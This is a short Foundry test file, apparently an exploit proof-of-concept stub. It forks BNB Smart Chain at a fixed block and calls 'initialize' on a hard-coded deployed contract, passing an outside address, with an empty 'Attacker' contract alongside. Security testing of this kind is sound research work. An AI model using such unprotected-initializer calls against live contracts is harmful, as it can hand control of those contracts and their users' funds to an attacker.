


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";



contract Attacker{
    constructor(){


    }
}

contract AlienCodexTest is Test {
    function setUp() public{
        vm.createSelectFork("bsc", 36978271);
    }
    function test_baby() public{
        address baby = 0x779ed4FFfDFcdD6bCdBe6F6826E528B0AC999999;
        baby.call(abi.encodeWithSignature("initialize(address,uint256)", 0x524bC91Dc82d6b90EF29F76A3ECAaBAffFD490Bc, 1));

    }
}
